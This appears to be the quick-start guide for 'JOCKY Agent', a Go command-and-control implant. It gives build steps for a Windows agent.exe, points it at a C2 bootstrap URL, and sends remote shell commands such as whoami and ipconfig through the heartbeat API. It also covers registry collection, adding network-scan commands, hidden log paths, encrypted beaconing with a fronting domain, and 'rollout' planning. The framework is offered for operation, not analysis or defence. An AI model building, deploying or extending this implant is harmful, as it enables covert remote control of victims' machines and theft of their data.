# JOCKY Agent - Quick Start Guide

## Build Instructions

### Prerequisites
- Go 1.21 or higher
- Windows, macOS, or Linux
- Internet connection for dependency download

### Build Steps

```bash
# Clone/navigate to the agent directory
cd agent/

# Download dependencies
go mod tidy

# Build the agent binary
go build -o agent.exe .
```

**Output:** `agent.exe` (~10.4 MB)

### Cross-Platform Build

```bash
# Build for Windows on Linux/macOS
GOOS=windows GOARCH=amd64 go build -o agent.exe .

# Build for Linux
GOOS=linux GOARCH=amd64 go build -o agent .

# Build for macOS
GOOS=darwin GOARCH=arm64 go build -o agent .
```

## Running the Agent Locally

### Basic Execution

```bash
# Run the agent (requires bootstrap server to be available)
./agent.exe
```

### With Custom Bootstrap URL

Edit the code or set environment variable:
```go
const ConfigBootstrapURL = "https://your-c2-server.com/api/v1/config/bootstrap"
```

Then rebuild and run.

### Expected Output

On successful startup:
```
[*] JOCKY Agent [random-id] starting (version 1.0.0)
[+] Agent registered: agent-[unique-id]
[+] Beaconing to: https://c2.example.com
```

On bootstrap failure:
```
[FATAL] Bootstrap failed after retries: connection refused
```

## Local Testing

### Test Environment Setup

1. **Create a test C2 server** (using Flask, Node.js, etc.)
2. **Implement bootstrap endpoint** that returns valid config
3. **Run agent locally** with test C2 server URL
4. **Send commands** through C2 server API
5. **Monitor logs** in `%TEMP%\.jocky\agent.log`

### Sample Bootstrap Response

```json
{
  "valid": true,
  "agent_id": "agent-test-001",
  "agent_secret": "test-secret-32-chars-minimum",
  "config": {
    "listener_url": "http://localhost:8000",
    "front_domain": "localhost",
    "c2_auth": "test-auth-secret",
    "heartbeat_interval": 5000000000,
    "tls_verify": false,
    "log_level": "debug",
    "timeout": 15000000000
  }
}
```

### Test Commands

Once agent is running and connected:

```bash
# Test shell execution
curl -X POST http://localhost:8000/api/v1/agent/heartbeat \
  -H "X-C2-Auth: test-auth-secret" \
  -H "X-Agent-Secret: test-secret-32-chars-minimum" \
  -H "X-Agent-ID: agent-test-001" \
  -H "Content-Type: application/json" \
  -d '{"agent_id": "agent-test-001"}' \
  -d '{"deployment": {"deploy_id": "1", "script_id": "1", "code": "whoami"}}'
```

## Development Workflow

### Project Structure

```
agent/
├── main.go              # Main agent code
├── go.mod              # Go module definition
├── go.sum              # Dependency checksums
├── agent.exe           # Compiled binary
├── PRODUCTION_GUIDE.md # Deployment guide
├── CONFIG_REFERENCE.md # Configuration documentation
└── SECURITY_CHECKLIST.md
```

### Making Changes

1. **Edit `main.go`** with your changes
2. **Run `go fmt`** to format code
3. **Run `go build`** to verify compilation
4. **Test locally** before deploying
5. **Update documentation** if behavior changed

### Code Organization

The main agent has several sections:

- **Configuration Management** (lines 50-150)
- **Bootstrap & State Management** (lines 150-300)
- **Logging** (lines 300-450)
- **Script Execution** (lines 450-600)
- **Cryptography** (lines 600-700)
- **HTTP Communications** (lines 700-900)

### Adding Features

Example: Adding a new command type

```go
// In executeJOCKY function
if strings.Contains(script, "network_scan(") {
    target := extractQuotedArg(script, "network_scan(")
    if target != "" {
        return performNetworkScan(target)
    }
}

// Add function
func performNetworkScan(target string) string {
    // Implementation here
    return "scan results"
}
```

## Debugging

### Enable Debug Logging

Modify bootstrap response to include:
```json
"config": {
  "log_level": "debug",
  ...
}
```

### Check Local Logs

```bash
# View agent log (Windows)
type %TEMP%\.jocky\agent.log

# View agent log (Linux/macOS)
cat /tmp/.jocky/agent.log

# Follow logs (Linux/macOS)
tail -f /tmp/.jocky/agent.log
```

### Common Debug Messages

```
[DEBUG] Registering at: https://c2.example.com/api/v1/agent/register
[DEBUG] Heartbeat to: https://c2.example.com/api/v1/agent/heartbeat
[DEBUG] Heartbeat returned 200
[DEBUG] Task received: script-123
[DEBUG] Command execution error: ...
```

### Troubleshooting

**Problem:** Agent fails to connect
- Check network connectivity: `ping c2.example.com`
- Verify C2 server is running
- Check firewall rules
- Review debug logs for specific error

**Problem:** Bootstrap loop
- Verify bootstrap response is valid JSON
- Check `tls_verify` setting matches server certificate
- Ensure all required config fields are present
- Review retry backoff in logs

**Problem:** Commands fail with "timeout"
- Increase `timeout` in server config
- Check command execution time
- Verify no hanging processes
- Monitor system resources (CPU, disk)

**Problem:** Encryption errors
- Verify agent_secret is consistent
- Check PBKDF2 key derivation
- Ensure AES-256-GCM is correctly implemented
- Verify base64 encoding/decoding

## Testing Commands

### Command Execution Tests

```bash
# Test 1: Simple shell command
Code: "whoami"
Expected: Current username

# Test 2: With exec() wrapper
Code: exec("ipconfig")
Expected: Network configuration

# Test 3: Registry collection (Windows)
Code: collect_registry("HKLM\\Software\\Microsoft\\Windows")
Expected: Registry key values
```

### Error Cases

```bash
# Timeout test
Code: "timeout /t 20" (Windows)
Expected: Command timeout after 15 seconds

# Invalid registry path
Code: collect_registry("INVALID\\Path")
Expected: error: unknown hive INVALID

# Very large output
Code: "for /L %i in (1,1,1000000) do echo %i" (Windows)
Expected: Output capped at 10MB
```

## Performance Testing

### Baseline Performance

```bash
# Memory usage (idle)
Expected: <10 MB

# CPU usage (idle)
Expected: <1%

# Heartbeat latency
Expected: 200-500 ms

# Command execution (simple)
Expected: <1 second
```

### Load Testing

```bash
# Simulate rapid commands
For i in 1..100:
  Send command
  Wait for result
  
Expected: All complete successfully
```

## Dependencies

### Direct Dependencies
- `golang.org/x/crypto/pbkdf2` - Key derivation
- `golang.org/x/sys/windows/registry` - Windows registry access

### Standard Library
- `crypto/aes`, `crypto/cipher` - Encryption
- `crypto/sha256`, `crypto/tls` - Security
- `crypto/rand` - Secure randomness
- `encoding/json`, `encoding/base64` - Data encoding
- `net/http` - HTTP communications
- `os/exec` - Command execution
- `sync` - Concurrency primitives

## Version Management

The agent version is defined at the top:

```go
const AgentVersion = "1.0.0"
```

Update this when releasing new versions. Version appears in:
- User-Agent header: `JOCKY-Agent/1.0.0`
- All logged events
- Bootstrap responses

## Deployment Verification

After building, verify the binary:

```bash
# Check file size (should be ~10 MB)
ls -lh agent.exe

# Verify it's a valid executable
file agent.exe

# Run a quick syntax test (will fail if bootstrap fails, but no errors)
agent.exe &
sleep 2
kill %1
echo "Binary is valid"
```

## Getting Help

### Common Resources
- `PRODUCTION_GUIDE.md` - Deployment procedures
- `CONFIG_REFERENCE.md` - Configuration options
- `SECURITY_CHECKLIST.md` - Security best practices
- `main.go` comments - Implementation details

### Error Messages

The agent logs detailed error messages. Key patterns:

- `[ERROR]` - Serious issue requiring attention
- `[WARN]` - Warning condition, agent continues
- `[INFO]` - Standard operational event
- `[DEBUG]` - Detailed debugging information

## Next Steps

1. **Understand the Architecture**: Read `PRODUCTION_GUIDE.md`
2. **Review Configuration**: Check `CONFIG_REFERENCE.md`
3. **Security Planning**: Complete `SECURITY_CHECKLIST.md`
4. **Test Locally**: Run agent with test C2 server
5. **Prepare Deployment**: Plan rollout strategy
6. **Monitor Operations**: Set up agent monitoring

---

**Version**: 1.0.0  
**Last Updated**: 2026-08-29  
**Contact**: jocky-framework@example.com
